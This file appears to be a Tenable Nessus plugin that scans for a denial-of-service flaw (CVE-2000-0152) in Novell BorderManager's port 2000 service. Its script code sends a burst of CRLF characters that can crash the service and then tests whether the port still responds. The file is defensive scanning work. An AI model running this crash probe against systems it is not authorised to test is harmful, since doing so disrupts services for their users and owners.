#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10163);
  script_version ("$Revision: 1.14 $");
  script_cve_id("CVE-2000-0152");
  script_xref(name:"OSVDB", value:"7468");

  script_name(english:"Novell BorderManager Port 2000 Telnet DoS");
  script_summary(english:"Crashes the remote Border Manager");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The port 2000 is open, and Novell BorderManager
*might* be listening on it.

There is a denial of service attack that allow
an intruder to make a Novell BorderManager 3.5 slowly
die.

If you see an error message on this computer telling
you 'Short Term Memory Allocator is out of Memory'
then you are vulnerable to this attack.

An attacker may use this flaw to prevent this
service from doing its job and to prevent the
user of this station to work on it.

*** If there is no error message whatsoever on this
*** computer, then this is likely a false positive."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Contact Novell and ask for a patch or filter incoming TCP connections to port 2000."
  );


  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
  script_family(english:"Firewalls");
  script_require_ports(2000);
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

if(get_port_state(2000))
{
 soc = open_sock_tcp(2000);
 if(soc)
 {
  msg = crap(data:"\r\n", length:20);
  send(socket:soc, data:msg);
  close(soc);
  soc = open_sock_tcp(2000);
  if ( ! soc ) security_warning(2000);
  else close(soc);
 }
}
